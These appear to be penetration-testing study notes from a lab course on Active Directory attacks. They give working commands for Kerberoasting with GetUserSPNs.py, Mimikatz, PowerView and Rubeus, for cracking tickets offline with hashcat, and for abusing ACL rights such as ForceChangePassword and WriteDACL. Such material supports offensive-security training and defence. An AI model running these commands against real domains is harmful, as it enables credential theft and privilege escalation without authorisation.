## Kerberosting from Linux
## Kerberoasting with GetUserSPNs.py
Listing SPN Accounts with GetUserSPNs.py
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
Requesting all TGS Tickets
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```
Requesting a Single TGS ticket
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
Saving the TGS Ticket to an Output File
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
Cracking the Ticket Offline with Hashcat
```
 hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

## Kerberoasting from Windows
### Manual method
#### Enumerating SPNs with setspn.exe
```
setspn.exe -Q */*
```
Targeting a single user. These tickets will be loaded into memory and can be extracted by using mimikatz.
```
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
Retrieve all tickets using setspn.exe
```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
Extracting tickets from memory with Mimikatz
```
mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export
```
The base64 output can be taken and decoded to obtain the kirbi file. This kirbi file needs to be converted by using kirbi2john and hashcrack can be used to crack it.
```
echo "<base64 blob>" |  tr -d \\n
cat encoded_file | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```
### Automated Tools - Powerview
```
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```
for specific user
```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
exporting all tickets to a CSV file
```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
### Rubeus
accounts with RC4 encryption are easy to crack
```
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
specific user
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```
Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.
If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.
```
 Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
hashcat code for aes
```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```
/tgtdeleg flag can be used to downgrade encryption to RC4. Only works on server 2016 and older.


![image](https://github.com/Kript0r3x/CPTS/assets/65650002/e8cf8acc-d7b1-4e10-8b70-d0d5f8003528)

ForceChangePassword abused with Set-DomainUserPassword
Add Members abused with Add-DomainGroupMember
GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
GenericWrite abused with Set-DomainObject
WriteOwner abused with Set-DomainObjectOwner
WriteDACL abused with Add-DomainObjectACL
AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
Addself abused with Add-DomainGroupMember

- ForceChangePassword - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
- GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
- AddSelf - shows security groups that a user can add themselves to.
- GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

## Enumerating ACLs with PowerView
```
 Find-InterestingDomainAcl
```
```
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
### Performing a Reverse Search & Mapping to a GUID Value
```
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```
### Using the -ResolveGUIDs Flag
```
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
### Creating a List of Domain Users
```
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
### A useful for loop
```
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
keep on enumerate the rights and depending on it look for the domain groups, nested groups and their permissions
### finding the nested group
```
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

ACLs can also be enumerated easily by using bloodhoud. Look for **outbound control rights** it will give us lot of information.
